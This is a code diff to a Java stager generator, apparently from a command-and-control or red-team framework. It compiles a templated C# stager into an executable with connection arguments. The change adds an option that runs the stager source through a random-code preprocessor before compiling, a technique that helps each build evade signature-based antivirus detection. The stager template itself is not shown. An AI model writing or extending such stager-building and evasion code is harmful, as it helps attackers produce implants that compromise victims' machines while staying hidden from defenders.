@@ -20,8 +20,13 @@ public class StagerGenerator {
 	public static final Path TEMPORARY_DISK_SRC_FILE = Paths.get("tmp_stager_file");
 	public static final Path TEMPORARY_DISK_EXE_FILE = Paths.get("tmp_stager.exe");
 
-	public static String generateStagerExe(Path configDirectory, String stagerType, List<String> connectionArgs) throws IOException {
-		String fileText = generateStagedSourceFile(configDirectory, stagerType, connectionArgs);
+	public static String generateStagerExe(Path configDirectory, String stagerType, List<String> connectionArgs, boolean permuteCode) throws IOException {
+		String fileText;
+		if(permuteCode) {
+			fileText = generateStagedSourceFileWithRandomCode(configDirectory, stagerType, connectionArgs);
+		}else {
+			fileText = generateStagedSourceFile(configDirectory, stagerType, connectionArgs);
+		}
 		Files.writeString(TEMPORARY_DISK_SRC_FILE, fileText);
 		Process process = Runtime.getRuntime().exec(String.format(
 				"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc /r:System.Net.Http.dll -target:exe -out:"
@@ -39,7 +44,16 @@ public class StagerGenerator {
 		
 		return b64;
 	}
+	
+	public static String generateStagerExe(Path configDirectory, String stagerType, List<String> connectionArgs) throws IOException {
+		return generateStagerExe(configDirectory, stagerType, connectionArgs, false);
+	}
 
+	public static String generateStagedSourceFileWithRandomCode(Path configDirectory, String stagerType, List<String> connectionArgs)  throws IOException{
+		String baseCode = generateStagedSourceFile(configDirectory, stagerType, connectionArgs);
+		return RandomCodePreprocessor.processFile(baseCode);
+	}
+	
 	public static String generateStagedSourceFile(Path configDirectory, String stagerType, List<String> connectionArgs) throws IOException {
 		String file = Files.readString(Paths.get(configDirectory.toAbsolutePath().toString(), "stager.cs"));
 		Path assembliesPath = Paths.get(configDirectory.toAbsolutePath().toString(), "assemblies_" + stagerType);
